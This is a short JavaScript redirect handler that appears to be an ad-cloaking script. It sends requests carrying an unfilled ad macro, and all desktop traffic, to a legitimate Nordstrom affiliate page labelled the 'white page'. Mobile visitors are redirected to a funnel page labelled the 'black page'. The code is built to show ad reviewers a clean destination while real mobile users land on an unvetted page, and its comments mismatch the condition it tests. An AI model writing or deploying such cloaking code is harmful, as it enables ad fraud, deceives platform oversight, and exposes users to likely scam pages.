export default function handler(req, res) {
    // URLs to redirect
    const whitePageURL = "https://www.nordstrom.com/s/7503463?color=PORTOBELLO&utm_channel=low_nd_affiliates_shopping&utm_content=&utm_term=57486&utm_source=impact&utm_medium=affiliate_shopping&utm_campaign=ShopStyle%20Inc.&irclickid=zuT0pgzy4xyKWzuSKa0zk3%3AAUks04p0OGQ07Wc0&irgwc=1";
    const blackPageURL = "https://qgclxsamql.myfunnelish.com/imbassd-1735585339447351";
  
    // Parse the UTM parameters from the request URL
    const queryParams = new URLSearchParams(req.url.split('?')[1]);
    const utmCampaign = queryParams.get('utm_campaign');
  
    // Get the User-Agent from the request headers
    const userAgent = req.headers['user-agent'] || '';
    const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
  
    // Redirection logic
    if (utmCampaign === '__AID_NAME__') {
      // UTM campaign 'l1' takes priority for both desktop and mobile
      res.writeHead(302, { Location: whitePageURL });
    } else if (isMobileDevice) {
      // Mobile devices without 'l1' campaign
      res.writeHead(302, { Location: blackPageURL });
    } else {
      // Desktop devices without 'l1' campaign
      res.writeHead(302, { Location: whitePageURL });
    }
  
    res.end();
  }
